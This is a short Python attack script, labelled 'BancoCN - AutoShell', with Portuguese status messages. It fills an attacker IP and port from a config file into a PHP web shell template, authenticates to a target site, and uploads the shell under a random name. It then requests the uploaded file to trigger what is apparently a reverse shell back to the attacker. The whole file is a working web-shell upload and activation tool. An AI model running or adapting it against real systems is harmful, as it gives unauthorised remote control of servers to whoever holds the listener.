from cn import Context
from json import load
from requests import get
from hpparser import findImg
from utils import randomString

cnFile = "autoshell_base.php7"

print("** BancoCN - AutoShell")

with open(cnFile, 'r') as input:
   json = {}
   with open("conf.json", 'r') as f:
     json = load(f)
   with open('autoshell.php7', 'w') as output:
      output.write(input.read().replace("%as_ip%", json['ip_addr']).replace("%as_port%", str(json['port'])))

ctx = Context()

print(" * Autenticando SESSID")
ctx.authenticate()

print(" * Fazendo Upload")

url = ctx.upload(randomString(8), 'autoshell.php7', open('autoshell.php7'))

print(f" * Ligando shell url={url}")
get(findImg(get(url, timeout=30).text), timeout=999)